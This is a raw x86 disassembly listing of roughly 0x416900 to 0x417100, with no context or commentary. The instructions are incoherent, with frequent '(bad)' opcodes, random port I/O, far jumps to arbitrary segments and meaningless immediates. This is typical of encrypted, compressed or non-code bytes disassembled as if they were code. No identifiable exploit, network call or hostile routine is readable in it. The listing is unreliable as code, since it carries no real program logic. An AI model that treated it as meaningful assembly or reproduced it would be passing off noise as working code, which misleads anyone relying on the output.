  4168f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168f8:	cmp    BYTE PTR [eax-0x19],0x27
  4168fc:	stos   BYTE PTR es:[edi],al
  4168fd:	push   ebx
  4168fe:	pop    ecx
  4168ff:	das    
  416900:	or     ebx,DWORD PTR [ebp+ebp*4+0x89a67c3]
  416907:	outs   dx,BYTE PTR ds:[esi]
  416908:	lds    edx,FWORD PTR [ebp+0x7c]
  41690b:	xchg   ebp,eax
  41690c:	stos   DWORD PTR es:[edi],eax
  41690d:	imul   ebx,DWORD PTR [edx+eiz*8+0x52],0xfffffff0
  416912:	pusha  
  416913:	or     bh,BYTE PTR [eax+0x3e816dbc]
  416919:	popf   
  41691a:	aam    0x36
  41691c:	xchg   esi,eax
  41691d:	sub    eax,0xe08ba885
  416922:	in     eax,0x2f
  416924:	stos   DWORD PTR es:[edi],eax
  416925:	mov    al,ds:0x5854768a
  41692a:	xchg   edx,eax
  41692b:	jmp    0x416952
  41692d:	test   DWORD PTR [edi],ebp
  41692f:	or     DWORD PTR ds:0x674c18e7,edx
  416935:	cli    
  416936:	mov    cl,0xe1
  416938:	mov    bl,0x33
  41693a:	dec    edi
  41693b:	jp     0x4168d4
  41693d:	and    ebp,DWORD PTR [edx]
  41693f:	jmp    0x4168d6
  416941:	enter  0x2125,0xda
  416945:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416946:	mov    eax,ds:0xc5cc24c5
  41694b:	sbb    DWORD PTR [esi+0x37],esi
  41694e:	xchg   esp,eax
  41694f:	push   esi
  416950:	loopne 0x4168df
  416952:	mov    ah,0xcb
  416954:	jmp    0x416934
  416956:	sub    eax,0x697a590f
  41695b:	lock in eax,0x65
  41695e:	cli    
  41695f:	xchg   ebp,eax
  416960:	pop    esp
  416961:	push   ss
  416962:	scas   al,BYTE PTR es:[edi]
  416963:	fcom   QWORD PTR [edx]
  416965:	pop    edx
  416966:	out    0x2c,eax
  416968:	sub    BYTE PTR [ebx-0x2a],bh
  41696b:	out    dx,eax
  41696c:	inc    edi
  41696d:	push   edx
  41696e:	and    ch,0xf
  416971:	cli    
  416972:	push   ss
  416973:	mov    DWORD PTR ds:0x3cfa83c3,0x59cb1317
  41697d:	stos   BYTE PTR es:[edi],al
  41697e:	(bad)  
  41697f:	pop    ss
  416980:	inc    edx
  416981:	adc    esi,DWORD PTR [eax+ecx*1+0x388c55d1]
  416988:	arpl   sp,cx
  41698a:	mul    DWORD PTR [ebp+0x70421a94]
  416990:	jno    0x4169dd
  416992:	xchg   edx,eax
  416993:	xchg   edx,eax
  416994:	inc    ecx
  416995:	or     BYTE PTR [ebx-0x36c75cb8],ah
  41699b:	pop    ecx
  41699c:	(bad)  
  41699d:	xor    DWORD PTR [ecx-0x4412ef12],ebp
  4169a3:	dec    esp
  4169a4:	dec    ecx
  4169a5:	jl     0x4169e0
  4169a7:	dec    esp
  4169a8:	cmp    DWORD PTR ds:0xbe643678,ebp
  4169ae:	(bad)  
  4169af:	jns    0x4169e2
  4169b1:	outs   dx,DWORD PTR ds:[esi]
  4169b2:	mov    al,0xb
  4169b4:	mov    edi,0x1ba469eb
  4169b9:	inc    esi
  4169ba:	popf   
  4169bb:	jae    0x416999
  4169bd:	push   es
  4169be:	lock push edi
  4169c0:	lahf   
  4169c1:	xchg   ebp,eax
  4169c2:	mov    WORD PTR [esi],gs
  4169c4:	ficomp DWORD PTR [ebx-0x42]
  4169c7:	xor    eax,0x9b615dd8
  4169cc:	jecxz  0x416987
  4169ce:	test   eax,0x691ff08f
  4169d3:	mov    es,WORD PTR [ecx]
  4169d5:	cwde   
  4169d6:	fs inc ecx
  4169d8:	mov    esp,0xd41151cc
  4169dd:	ds mov bl,bl
  4169e0:	cld    
  4169e1:	cmp    BYTE PTR [esi+0x5],0x36
  4169e5:	sub    ebp,DWORD PTR [ecx-0x6a294755]
  4169eb:	adc    BYTE PTR [esi-0x70],dh
  4169ee:	push   ecx
  4169ef:	pop    ebx
  4169f0:	popf   
  4169f1:	push   cs
  4169f2:	mov    es,WORD PTR [eax-0x3d6d2f0b]
  4169f8:	ja     0x416a77
  4169fa:	leave  
  4169fb:	mov    cl,0x53
  4169fd:	repz test DWORD PTR ss:[edx],eax
  416a01:	pusha  
  416a02:	and    DWORD PTR [eax],edi
  416a04:	leave  
  416a05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a06:	push   eax
  416a07:	data16 into 
  416a09:	cmp    ecx,edi
  416a0b:	loop   0x416a19
  416a0d:	push   ebp
  416a0e:	pop    ecx
  416a0f:	adc    al,0x78
  416a11:	mov    BYTE PTR ds:0x969818d1,dl
  416a17:	adc    BYTE PTR [edx+ecx*4],0x90
  416a1b:	lds    ebp,FWORD PTR [ebp-0x2586f96a]
  416a21:	jo     0x416a8a
  416a23:	cmp    cl,dh
  416a25:	out    0xe3,eax
  416a27:	ins    BYTE PTR es:[edi],dx
  416a28:	add    BYTE PTR [esi-0xdc1eddc],bl
  416a2e:	or     eax,0x5413ee01
  416a33:	rol    BYTE PTR [edi],1
  416a35:	mov    edx,0x3f325b8e
  416a3a:	mov    BYTE PTR [edi+0x5b],al
  416a3d:	sub    DWORD PTR [esi+0x7f],0x45eac0ee
  416a44:	add    al,0x4c
  416a46:	fisub  WORD PTR [esi+0x1d]
  416a49:	sub    edx,DWORD PTR [edx]
  416a4b:	cmp    BYTE PTR ds:0xa7599a41,bh
  416a51:	repz or eax,0x8efcde2b
  416a57:	and    DWORD PTR [esi],esp
  416a59:	inc    ecx
  416a5a:	or     ah,BYTE PTR [esi+edx*8+0x6c]
  416a5e:	sbb    ch,BYTE PTR [ebx]
  416a60:	xor    bh,ah
  416a62:	arpl   WORD PTR [esi+0x9],si
  416a65:	jo     0x416a5a
  416a67:	arpl   ax,si
  416a69:	mov    WORD PTR [esi-0x1c7e9c],ds
  416a6f:	or     eax,0xa3b6e67d
  416a74:	hlt    
  416a75:	xor    ebp,DWORD PTR [ecx]
  416a77:	adc    al,0x7
  416a79:	fld    TBYTE PTR [ebx+ebp*2-0x3c]
  416a7d:	out    dx,al
  416a7e:	pop    ecx
  416a7f:	jns    0x416ac1
  416a81:	mov    ah,0xd0
  416a83:	xor    al,0xf4
  416a85:	imul   ebp,DWORD PTR [edx-0x109c6da7],0xe3775e51
  416a8f:	mov    cl,ah
  416a91:	(bad)  [edx+0x53e5dc3c]
  416a97:	xchg   esi,eax
  416a98:	rcr    ch,0xb
  416a9b:	ins    BYTE PTR es:[edi],dx
  416a9c:	popf   
  416a9d:	stos   BYTE PTR es:[edi],al
  416a9e:	int    0xcd
  416aa0:	adc    eax,0xb943a6ae
  416aa5:	test   DWORD PTR [ebx],edi
  416aa7:	xor    dl,BYTE PTR [esi]
  416aa9:	shr    dl,1
  416aab:	loope  0x416b2b
  416aad:	les    edx,FWORD PTR [ebp-0x26]
  416ab0:	xchg   ecx,eax
  416ab1:	pop    esp
  416ab2:	test   BYTE PTR [edx-0x252a6a68],bh
  416ab8:	inc    esi
  416ab9:	jb     0x416ac9
  416abb:	shl    BYTE PTR [edi-0x54],1
  416abe:	push   ecx
  416abf:	cdq    
  416ac0:	or     eax,0x1439e87
  416ac5:	jmp    0x416b2c
  416ac7:	dec    edx
  416ac8:	jb     0x416a57
  416aca:	sub    ebx,DWORD PTR [ecx-0x5c3a5538]
  416ad0:	loop   0x416b02
  416ad2:	(bad)  
  416ad3:	sbb    eax,esi
  416ad5:	bound  ecx,QWORD PTR [ebx+0x40898929]
  416adb:	mov    ds:0xdbd8df06,al
  416ae0:	mul    bl
  416ae2:	dec    ebp
  416ae3:	pop    ecx
  416ae4:	jae    0x416afe
  416ae6:	xchg   ebx,eax
  416ae7:	lds    ebx,FWORD PTR [edx-0x9]
  416aea:	mov    ecx,0x56cbc86c
  416aef:	xor    edi,esi
  416af1:	popa   
  416af2:	pop    esp
  416af3:	push   ss
  416af4:	jb     0x416afc
  416af6:	ret    0xca90
  416af9:	ins    DWORD PTR es:[edi],dx
  416afa:	inc    edi
  416afb:	cmp    DWORD PTR [edx+0x1a],esp
  416afe:	cli    
  416aff:	data16 jbe 0x416a9c
  416b02:	in     al,dx
  416b03:	call   DWORD PTR [ecx]
  416b05:	jmp    0x416b71
  416b07:	jne    0x416b86
  416b09:	ds jnp 0x416b29
  416b0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b0d:	loop   0x416b73
  416b0f:	dec    esi
  416b10:	(bad)  
  416b11:	mov    ebp,0xd37521c2
  416b16:	ds pop eax
  416b18:	and    al,0xd9
  416b1a:	jb     0x416ab0
  416b1c:	fld    DWORD PTR [ebp+ebp*1+0x2c]
  416b20:	xor    eax,0xab7a33df
  416b25:	dec    ebp
  416b26:	nop
  416b27:	mov    bh,BYTE PTR [eax-0x44]
  416b2a:	test   DWORD PTR [ebp-0x74],ecx
  416b2d:	or     eax,0x42029e3a
  416b32:	ins    DWORD PTR es:[edi],dx
  416b33:	(bad)  
  416b34:	outs   dx,BYTE PTR ds:[esi]
  416b35:	out    0x2e,eax
  416b37:	sbb    eax,0xb4533b8c
  416b3c:	cld    
  416b3d:	xor    BYTE PTR [esi+0x4e],0xe9
  416b41:	repz cdq 
  416b43:	xchg   ebp,eax
  416b44:	pop    ebx
  416b45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b46:	and    eax,0x111cf75e
  416b4b:	enter  0xcf,0x79
  416b4f:	pop    eax
  416b50:	adc    eax,0x6d6d46fa
  416b55:	ret    0x7544
  416b58:	scas   al,BYTE PTR es:[edi]
  416b59:	leave  
  416b5a:	repnz inc ebx
  416b5c:	fimul  WORD PTR [eax+0x1ad7f48b]
  416b62:	xor    BYTE PTR [edi],al
  416b64:	pop    edx
  416b65:	sbb    al,0x56
  416b67:	push   0xe358711d
  416b6c:	jge    0x416b21
  416b6e:	pop    ecx
  416b6f:	sar    ecx,1
  416b71:	inc    eax
  416b72:	fdiv   DWORD PTR es:[eax-0x595353b7]
  416b79:	cli    
  416b7a:	jle    0x416bbc
  416b7c:	hlt    
  416b7d:	loope  0x416b8b
  416b7f:	aad    0x60
  416b81:	xchg   edi,eax
  416b82:	push   edx
  416b83:	nop
  416b84:	xchg   ecx,eax
  416b85:	xchg   BYTE PTR [eax],ah
  416b87:	repz sbb dl,BYTE PTR [edx]
  416b8a:	test   BYTE PTR [eax+0x5e],bh
  416b8d:	pop    ds
  416b8e:	(bad)
  416b93:	cmp    bh,BYTE PTR [eax+0x5f6f68ee]
  416b99:	pop    ebx
  416b9a:	add    edx,esp
  416b9c:	jle    0x416b79
  416b9e:	lods   al,BYTE PTR ds:[esi]
  416b9f:	mov    BYTE PTR [ebx],al
  416ba1:	mov    dl,BYTE PTR ds:[edx-0x4b3c48f2]
  416ba8:	push   cs
  416ba9:	arpl   WORD PTR [ebx],sp
  416bab:	cmp    DWORD PTR [ebx],edx
  416bad:	xor    eax,0x5a18c778
  416bb2:	dec    ecx
  416bb3:	xchg   edx,eax
  416bb4:	push   cs
  416bb5:	mov    ah,0xd6
  416bb7:	add    cl,cl
  416bb9:	push   edi
  416bba:	add    eax,0x76956b80
  416bbf:	(bad)  
  416bc0:	mov    edx,0x1528531f
  416bc5:	ret    
  416bc6:	lock call FWORD PTR [ebx-0x39]
  416bca:	inc    esi
  416bcb:	int3   
  416bcc:	push   edi
  416bcd:	mov    ebx,0xd92115de
  416bd2:	fs out dx,eax
  416bd4:	jno    0x416be7
  416bd6:	cwde   
  416bd7:	test   ecx,0x5be1d0aa
  416bdd:	inc    esp
  416bde:	fcmovnbe st,st(7)
  416be0:	add    eax,0xbd024367
  416be5:	add    eax,0x372e92bd
  416bea:	pop    ds
  416beb:	sbb    eax,DWORD PTR [esi-0x6f]
  416bee:	jnp    0x416c54
  416bf0:	bound  ebx,QWORD PTR [esi+0x28]
  416bf3:	sbb    al,0xba
  416bf5:	cmp    BYTE PTR [ecx-0x33],cl
  416bf8:	add    BYTE PTR [esi],ch
  416bfa:	push   ds
  416bfb:	fimul  DWORD PTR [esi]
  416bfd:	jmp    0x416c51
  416bff:	sub    al,al
  416c01:	(bad)  
  416c02:	mov    ebx,0x5a8b5eb2
  416c07:	pop    ebp
  416c08:	xor    esi,DWORD PTR [edi+0xfeac388]
  416c0e:	(bad)  
  416c0f:	fcmovbe st,st(3)
  416c11:	jbe    0x416b9c
  416c13:	shl    BYTE PTR [eax],0xb3
  416c16:	pop    ecx
  416c17:	out    0xd5,eax
  416c19:	(bad)  
  416c1a:	outs   dx,DWORD PTR ds:[esi]
  416c1b:	les    ecx,FWORD PTR [ebx+0xb]
  416c1e:	stc    
  416c1f:	jo     0x416bed
  416c21:	sub    ebp,DWORD PTR [edi+eiz*4+0x2cd427e2]
  416c28:	int    0x37
  416c2a:	add    BYTE PTR [edx-0x7f],0xd0
  416c2e:	jmp    0x416c65
  416c30:	sub    al,0xa4
  416c32:	daa    
  416c33:	gs mov eax,0x22c7dcff
  416c39:	cmp    BYTE PTR [ebx],dl
  416c3b:	sbb    ebp,DWORD PTR [edx-0x254c8a02]
  416c41:	sbb    dl,BYTE PTR [eax+0x44]
  416c44:	jle    0x416c13
  416c46:	cmp    al,0xf5
  416c48:	pop    ebp
  416c49:	mov    ch,0xd8
  416c4b:	dec    edi
  416c4c:	pop    ebp
  416c4d:	add    edi,ebx
  416c4f:	jbe    0x416c61
  416c51:	add    eax,0x71a8de0e
  416c56:	mov    eax,ds:0xaaa4935a
  416c5b:	sbb    eax,0x9aa02360
  416c60:	jnp    0x416c50
  416c62:	pop    ebx
  416c63:	test   BYTE PTR [esi-0x3a],0x87
  416c67:	jp     0x416c00
  416c69:	add    dh,BYTE PTR [edx+0x43e54440]
  416c6f:	mov    esp,0xa5a1b3a2
  416c74:	mov    cl,0xf9
  416c76:	(bad)  
  416c77:	sub    DWORD PTR [eax-0x4fd6961e],edi
  416c7d:	pop    edi
  416c7e:	loop   0x416c27
  416c80:	lds    ecx,FWORD PTR [esi]
  416c82:	mov    BYTE PTR [esi+0x56],0xc1
  416c86:	cmc    
  416c87:	fbstp  TBYTE PTR [ebx+0x34]
  416c8a:	inc    esi
  416c8b:	loopne 0x416c3b
  416c8d:	xchg   DWORD PTR [eax-0x1ed50bf],eax
  416c93:	jg     0x416cd0
	...
  416d11:	add    BYTE PTR [eax],al
  416d13:	add    BYTE PTR [ecx],bl
  416d15:	je     0x416ce6
  416d17:	(bad)  
  416d18:	out    dx,eax
  416d19:	(bad)  
  416d1a:	cmp    esi,esi
  416d1c:	repnz sahf 
  416d1e:	mov    ebx,0x90bb0023
  416d23:	mov    cl,0x90
  416d25:	adc    BYTE PTR [ecx],al
  416d27:	add    BYTE PTR [ecx+0x7],ch
  416d2a:	add    BYTE PTR [eax],al
  416d2c:	scas   eax,DWORD PTR es:[edi]
  416d2d:	loop   0x416d96
  416d2f:	mov    es,edx
  416d31:	mov    edi,0x8efa27d1
  416d36:	xor    al,0xe0
  416d38:	lahf   
  416d39:	into   
  416d3a:	sahf   
  416d3b:	in     al,0x59
  416d3d:	jl     0x416d84
  416d3f:	jge    0x416d96
  416d41:	push   ss
  416d42:	sbb    BYTE PTR [ebx],bh
  416d44:	and    ebp,DWORD PTR [ebp-0x19091702]
  416d4a:	mov    WORD PTR ds:0x247aed9e,cs
  416d50:	mov    ebp,0x4c54cb1c
  416d55:	jbe    0x416d09
  416d57:	jl     0x416d48
  416d59:	jecxz  0x416d52
  416d5b:	int3   
  416d5c:	ret    0xf560
  416d5f:	mov    esp,0xe2e9c63e
  416d64:	sbb    BYTE PTR [ecx-0x52e55f22],0x7c
  416d6b:	mov    al,ds:0x9cdcbde6
  416d70:	add    BYTE PTR [ebx],bl
  416d72:	retf   
  416d73:	xchg   BYTE PTR [edx],dh
  416d75:	or     dl,al
  416d77:	mov    edx,0x67e17802
  416d7c:	pop    es
  416d7d:	jne    0x416d8e
  416d7f:	cwde   
  416d80:	out    dx,al
  416d81:	jo     0x416d4e
  416d83:	cmp    DWORD PTR [ebx],esp
  416d85:	cmp    BYTE PTR [eax+0x14],0xa9
  416d89:	sbb    eax,0xe1dd3849
  416d8e:	js     0x416d5f
  416d90:	mov    al,0x5e
  416d92:	cmp    ebp,DWORD PTR [eax-0x37]
  416d95:	dec    ebp
  416d96:	lods   al,BYTE PTR ds:[esi]
  416d97:	and    ah,bh
  416d99:	bound  ebp,QWORD PTR [esp+ebx*8+0x7]
  416d9d:	arpl   WORD PTR [ecx+0x66],bx
  416da0:	arpl   WORD PTR [ecx+0xfe3764],bx
  416da6:	ret    0xcf6e
  416da9:	push   0xffffff9c
  416dab:	loopne 0x416dcb
  416dad:	stos   BYTE PTR es:[edi],al
  416dae:	(bad)  
  416daf:	pop    edx
  416db0:	iret   
  416db1:	je     0x416df8
  416db3:	push   edi
  416db4:	mov    eax,0x32d0e4c1
  416db9:	arpl   WORD PTR [edx-0x30261962],dx
  416dbf:	out    0x4e,al
  416dc1:	fdivr  st,st(7)
  416dc3:	adc    dl,al
  416dc5:	jg     0x416d6e
  416dc7:	in     al,0x5e
  416dc9:	fxch   st(5)
  416dcb:	add    edx,DWORD PTR ds:0xe4ba448e
  416dd1:	push   ss
  416dd2:	fsub   QWORD PTR [esi-0x57891431]
  416dd8:	(bad)  
  416dd9:	aad    0x17
  416ddb:	lds    esi,FWORD PTR [esi+esi*1-0x47]
  416ddf:	and    eax,0xb12afe4b
  416de4:	lods   al,BYTE PTR ds:[esi]
  416de5:	shl    DWORD PTR [esi-0x6d],cl
  416de8:	out    dx,al
  416de9:	sub    al,0x87
  416deb:	pop    esp
  416dec:	jmp    0x2d15:0x6ecc38e
  416df3:	push   ebx
  416df4:	clc    
  416df5:	iret   
  416df6:	in     eax,0x19
  416df8:	mov    edx,0xdd7151f7
  416dfd:	repnz fcom DWORD PTR [esi-0x84017ec]
  416e04:	sub    DWORD PTR [esi-0x73431330],edi
  416e0a:	mov    ?,esi
  416e0c:	cmp    eax,0x1caba55a
  416e11:	pop    edi
  416e12:	pop    ss
  416e13:	mov    bl,0xeb
  416e15:	pop    esi
  416e16:	xor    al,ah
  416e18:	jp     0x416e37
  416e1a:	(bad)  
  416e1b:	mov    ebp,0x442db756
  416e20:	enter  0xf082,0x56
  416e24:	pop    ecx
  416e25:	addr16 dec ecx
  416e27:	je     0x416dee
  416e29:	cmc    
  416e2a:	loop   0x416dd0
  416e2c:	popa   
  416e2d:	mov    ds,esi
  416e2f:	xchg   esi,eax
  416e30:	cld    
  416e31:	adc    eax,0x398675c8
  416e36:	jg     0x416db9
  416e38:	inc    ecx
  416e39:	sub    edx,DWORD PTR [ecx+0x19366751]
  416e3f:	push   ds
  416e40:	cmp    al,0xb6
  416e42:	dec    edi
  416e43:	das    
  416e44:	mov    esi,0x2549cf0f
  416e49:	mov    bl,0xaf
  416e4b:	add    DWORD PTR [eax+ecx*2-0x19],esp
  416e4f:	fisub  DWORD PTR [eax+0x26]
  416e52:	mov    ch,ch
  416e54:	int    0x6a
  416e56:	jb     0x416e02
  416e58:	fwait
  416e59:	sbb    esp,DWORD PTR [eax+0x67]
  416e5c:	mov    esi,0x11ed736c
  416e61:	adc    bh,0xeb
  416e64:	push   ebp
  416e65:	mov    ecx,0xb1ece6a9
  416e6a:	xchg   ebx,eax
  416e6b:	xchg   edx,eax
  416e6c:	stos   BYTE PTR es:[edi],al
  416e6d:	xchg   ebp,eax
  416e6e:	pop    eax
  416e6f:	xchg   esp,eax
  416e70:	cmp    eax,0x29e53f74
  416e75:	pop    es
  416e76:	int    0x68
  416e78:	ins    DWORD PTR es:[edi],dx
  416e79:	add    DWORD PTR [ecx],ebp
  416e7b:	sub    al,0x2c
  416e7d:	sahf   
  416e7e:	aaa    
  416e7f:	inc    ebp
  416e80:	into   
  416e81:	xor    DWORD PTR [ebp+edi*8+0x58],edi
  416e85:	loopne 0x416e45
  416e87:	call   0x8b1a92dc
  416e8c:	inc    eax
  416e8d:	mov    ebx,0xc594014e
  416e92:	loope  0x416e6e
  416e94:	push   ebp
  416e95:	jl     0x416eee
  416e97:	dec    esp
  416e98:	(bad)  
  416e99:	adc    ebx,esp
  416e9b:	mov    dl,0xf3
  416e9d:	cmp    edi,esi
  416e9f:	mov    dl,0xa1
  416ea1:	mov    BYTE PTR [esi],bh
  416ea3:	es mov ch,0xd6
  416ea6:	push   esi
  416ea7:	sbb    ebp,eax
  416ea9:	sbb    ah,al
  416eab:	fidivr WORD PTR [ebx]
  416ead:	xchg   edx,eax
  416eae:	repnz scas al,BYTE PTR es:[edi]
  416eb0:	int    0x8c
  416eb2:	sbb    eax,0xf069cc20
  416eb7:	mov    bh,0xfd
  416eb9:	inc    edx
  416eba:	push   ss
  416ebb:	sbb    ch,bh
  416ebd:	push   ss
  416ebe:	lds    eax,FWORD PTR [edx+0x24989dbf]
  416ec4:	cwde   
  416ec5:	xchg   esp,eax
  416ec6:	jge    0x416eac
  416ec8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ec9:	sub    al,0x9d
  416ecb:	sbb    dl,BYTE PTR [ecx+ebp*1+0x4f]
  416ecf:	mov    ch,0xe5
  416ed1:	inc    esi
  416ed2:	fidivr DWORD PTR [esi+0x53aaaf23]
  416ed8:	and    al,0xc8
  416eda:	or     al,0xc1
  416edc:	bound  ebx,QWORD PTR [esi]
  416ede:	imul   esp,DWORD PTR [eax-0x6b],0xffffff83
  416ee2:	inc    BYTE PTR [edi]
  416ee4:	inc    esi
  416ee5:	leave  
  416ee6:	rcr    BYTE PTR [ecx-0x7dcff97b],0x19
  416eed:	adc    BYTE PTR [ebx+ebp*1-0x3c],al
  416ef1:	imul   ecx,ebx,0xffffffd5
  416ef4:	(bad)  
  416ef6:	test   al,dl
  416ef8:	int    0x4b
  416efa:	aaa    
  416efb:	push   esi
  416efc:	adc    al,0xdf
  416efe:	jmp    0xca51:0x3bb95857
  416f05:	repz cmp eax,edi
  416f08:	out    dx,al
  416f09:	call   0x8d6:0xbf4b268c
  416f10:	in     eax,0xb3
  416f12:	and    BYTE PTR [ebx-0x7f],al
  416f15:	hlt    
  416f16:	into   
  416f17:	mov    ah,0x28
  416f19:	dec    esi
  416f1a:	sbb    ebp,DWORD PTR [ebx]
  416f1c:	mov    esp,0xa3057a22
  416f21:	mov    WORD PTR [eax],?
  416f23:	js     0x416f07
  416f25:	lods   eax,DWORD PTR ds:[esi]
  416f26:	ficom  WORD PTR [ebx-0x33]
  416f29:	xchg   ebp,eax
  416f2a:	addr16 mov eax,ds:0x4226
  416f2e:	es aam 0xe9
  416f31:	or     eax,0x13df610d
  416f36:	sbb    DWORD PTR [ecx],esi
  416f38:	xchg   BYTE PTR [esi],bl
  416f3a:	test   esp,esi
  416f3c:	jp     0x416f10
  416f3e:	rcr    DWORD PTR [ebp+0x1e],cl
  416f41:	(bad)  
  416f42:	int    0x99
  416f44:	icebp  
  416f45:	sahf   
  416f46:	xchg   DWORD PTR [ecx+eax*4],eax
  416f49:	and    bl,dl
  416f4b:	dec    edi
  416f4c:	jns    0x416f46
  416f4e:	sar    esi,cl
  416f50:	and    ebp,DWORD PTR [edx]
  416f52:	stc    
  416f53:	imul   ch
  416f55:	xor    al,BYTE PTR [eax-0x27]
  416f58:	push   ebx
  416f59:	push   edi
  416f5a:	int3   
  416f5b:	bound  edx,QWORD PTR [ebx-0x6e4f38ff]
  416f61:	and    ah,BYTE PTR [ebx]
  416f63:	mov    BYTE PTR [bx],ch
  416f66:	xor    al,0x91
  416f68:	jmp    0x416f6e
  416f6a:	dec    ebx
  416f6b:	lock enter 0x72f2,0x5b
  416f70:	lea    ebx,ds:0xdaa86a55
  416f76:	jp     0x416f43
  416f78:	outs   dx,DWORD PTR ds:[esi]
  416f79:	jo     0x416f75
  416f7b:	out    dx,al
  416f7c:	aad    0xa3
  416f7e:	xchg   esp,eax
  416f7f:	cmp    ebx,DWORD PTR [edx]
  416f81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f82:	lea    ecx,[ecx]
  416f84:	aas    
  416f85:	mov    edx,0xcff1904e
  416f8a:	ins    DWORD PTR es:[edi],dx
  416f8b:	push   es
  416f8c:	xor    al,0x75
  416f8e:	sub    al,0x84
  416f90:	es sub eax,0xfb2e3fbc
  416f96:	das    
  416f97:	mov    DWORD PTR [edi+0xc2f4c74],ebp
  416f9d:	push   0xbdd8164d
  416fa2:	xchg   BYTE PTR [ecx],ch
  416fa4:	or     BYTE PTR ds:0x4826c83b,ah
  416faa:	inc    ebp
  416fab:	ror    BYTE PTR [edx+0x70b0c24b],0x6c
  416fb2:	mov    ds:0x12305541,al
  416fb7:	bound  eax,QWORD PTR [edi]
  416fb9:	stc    
  416fba:	out    dx,eax
  416fbb:	mov    eax,0x727f5828
  416fc0:	ret    0xeaba
  416fc3:	pop    esp
  416fc4:	xchg   ecx,eax
  416fc5:	or     DWORD PTR [ecx-0x24],ebp
  416fc8:	mov    eax,0x762421d
  416fcd:	stos   BYTE PTR es:[edi],al
  416fce:	ret    
  416fcf:	pop    eax
  416fd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fd1:	das    
  416fd2:	icebp  
  416fd3:	sbb    ah,BYTE PTR [eax]
  416fd5:	test   eax,0x23aa574d
  416fda:	dec    ebx
  416fdb:	gs xchg edi,eax
  416fdd:	loopne 0x416f7f
  416fdf:	icebp  
  416fe0:	sbb    al,0xb5
  416fe2:	xor    DWORD PTR [ecx],esp
  416fe4:	popf   
  416fe5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fe6:	xor    eax,DWORD PTR [ebp-0x70]
  416fe9:	jb     0x416f87
  416feb:	jmp    FWORD PTR [edx]
  416fed:	and    edi,edi
  416fef:	lods   eax,DWORD PTR ds:[esi]
  416ff0:	mov    esp,0x2e2987ff
  416ff5:	mov    ds:0x3f166922,al
  416ffa:	mov    bl,0xaf
  416ffc:	rcl    DWORD PTR [edx],cl
  416ffe:	cmp    ch,BYTE PTR [edx]
  417000:	scas   eax,DWORD PTR es:[edi]
  417001:	mov    eax,0xa56f7fed
  417006:	xor    eax,0x10d51610
  41700b:	dec    ecx
  41700c:	fwait
  41700d:	lea    edx,[esi+0x6363f125]
  417013:	mov    DWORD PTR [ebx+eax*8],edi
  417016:	cs xor ch,ch
  417019:	sbb    DWORD PTR [ebp-0x5cd58482],eax
  41701f:	stc    
  417020:	jl     0x4170a1
  417022:	xor    eax,DWORD PTR [eax]
  417024:	pushf  
  417025:	ins    BYTE PTR es:[edi],dx
  417026:	outs   dx,BYTE PTR ds:[esi]
  417027:	(bad)  
  417028:	es jo  0x417008
  41702b:	(bad)  [ebp+0x51]
  41702e:	lahf   
  41702f:	sbb    BYTE PTR [esi+0x6b59abfe],0x2
  417036:	(bad)  
  417037:	jne    0x41704a
  417039:	outs   dx,BYTE PTR ds:[esi]
  41703a:	addr16 xchg ebp,eax
  41703c:	ret    
  41703d:	fsubr  st,st(3)
  41703f:	repz jo 0x416fc8
  417042:	repz inc edx
  417044:	imul   esp,edi,0xe9502582
  41704a:	pop    ecx
  41704b:	cdq    
  41704c:	sub    eax,0x3e36ffd2
  417051:	and    eax,0x26cae523
  417056:	bound  edi,QWORD PTR [eax]
  417058:	mov    dh,0xde
  41705a:	cs jnp 0x41708c
  41705d:	lods   al,BYTE PTR ds:[esi]
  41705e:	scas   eax,DWORD PTR es:[edi]
  41705f:	pusha  
  417060:	nop
  417061:	(bad)  
  417062:	retf   0x5f56
  417065:	push   0x17
  417067:	adc    BYTE PTR [ecx],0xd8
  41706a:	jae    0x417042
  41706c:	sahf   
  41706d:	jge    0x41707e
  41706f:	pop    ds
  417070:	popa   
  417071:	mov    al,ds:0x70b7f218
  417076:	lods   eax,DWORD PTR ds:[esi]
  417077:	push   ebx
  417078:	mov    WORD PTR [edi-0x30962910],ds
  41707e:	sub    al,0x83
  417080:	sub    DWORD PTR [edi+0x58],ebp
  417083:	(bad)
  417088:	icebp  
  417089:	adc    esi,DWORD PTR [edi+0x4485dcd0]
  41708f:	outs   dx,BYTE PTR ds:[esi]
  417090:	retf   
  417091:	pop    ebx
  417092:	int    0xc8
  417094:	mov    al,ds:0xf7fef30b
  417099:	hlt    
  41709a:	outs   dx,BYTE PTR ds:[esi]
  41709b:	adc    al,0x93
  41709d:	ins    BYTE PTR es:[edi],dx
  41709e:	inc    eax
  41709f:	sbb    ebp,esi
  4170a1:	xor    al,0x69
  4170a3:	jmp    0x881d:0xa95c68da
  4170aa:	xor    al,0x79
  4170ac:	fst    DWORD PTR gs:[edi-0x23]
  4170b0:	sbb    ch,bh
  4170b2:	and    DWORD PTR [ebx+0x7345030e],edx
  4170b8:	fsub   QWORD PTR [esi]
  4170ba:	mov    ebx,0xd14b070c
  4170bf:	mov    eax,ds:0x71ad69b5
  4170c4:	jae    0x4170b5
  4170c6:	sti    
  4170c7:	test   eax,0x81af2cdb
  4170cc:	test   eax,0x5b33475c
  4170d1:	cs pop esp
  4170d3:	loopne 0x4170b8
  4170d5:	push   ss
  4170d6:	xor    eax,0xdb2eb2ae
  4170db:	push   ebx
  4170dc:	rcl    BYTE PTR [edx-0x2d7a42ba],0x42
  4170e3:	mov    esp,0x4e1492a
  4170e8:	cmp    eax,0xf5f1ee3a
  4170ed:	inc    esi
  4170ee:	daa    
  4170ef:	in     al,0x2a
  4170f1:	daa    
  4170f2:	cmc    
  4170f3:	sub    ebp,DWORD PTR [eax+0x36]
  4170f6:	bound  esi,QWORD PTR [ebp+0x545c5756]
  4170fc:	push   ebp
  4170fd:	sub    esi,ecx
  4170ff:	mov    dl,0xb4
  417101:	and    bh,BYTE PTR [ecx+0x7b30a74e]
  417107:	mov    esp,0x8e9bc77c
